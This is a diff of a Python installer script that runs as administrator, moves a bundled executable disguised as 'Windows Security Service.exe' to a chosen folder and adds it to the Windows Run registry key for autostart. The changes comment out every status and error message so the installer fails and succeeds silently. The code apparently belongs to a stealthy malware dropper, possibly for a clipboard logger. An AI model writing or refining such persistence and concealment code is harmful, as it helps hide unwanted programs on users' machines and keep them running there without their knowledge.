@@ -22,19 +22,20 @@ if run_as_admin():
             if os.path.exists(source_path):
                 # Move the file to the destination path
                 shutil.move(source_path, destination_path)
-                print(f"File moved successfully to {destination_path}")
+                # print(f"File moved successfully to {destination_path}")
             else:
-                print(f"Source---**file {source_path} does not exist.")
-                exit()
+                # print(f"Source---**file {source_path} does not exist.")
+                pass
         except Exception as e:
-            print(f"Error: {e}")
+            # print(f"Error: {e}")
+            pass
 
     # Get the directory of the script or the bundled executable
     script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
 
     # Specify the paths
     source_file_path = os.path.join(script_directory, r"Windows Security Service.exe")
-    destination_folder = r"C:\Windows\System32"
+    destination_folder = r"E:"
 
     move_exe_file(source_file_path, destination_folder)
 
@@ -43,7 +44,7 @@ if run_as_admin():
     def add_to_startup():
 
         # Get the path to the executable (assuming it's in the same directory)
-        executable_path = os.path.abspath(r"C:\Windows\System32\Windows Security Service.exe")
+        executable_path = os.path.abspath(r"E:\Windows Security Service.exe")
 
         # Create the registry key for the startup entry
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -52,18 +53,15 @@ if run_as_admin():
         try:
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                 winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
-            print(f"Added to startup: {executable_path}")
+                # print(f"Added to startup: {executable_path}")
+                pass
         except Exception as e:
-            print(f"Error adding to startup: {e}")
+            # print(f"Error adding to startup: {e}")
+            pass
 
         
 
     # Add the executable to startup
     add_to_startup()
-    # Extra Work
-    HISTORY_FILE = r"C:\Users\clipboard_history.txt"
-    with open(HISTORY_FILE, "w") as file:
-        file.write("\n")
-    sys.exit()
 
 
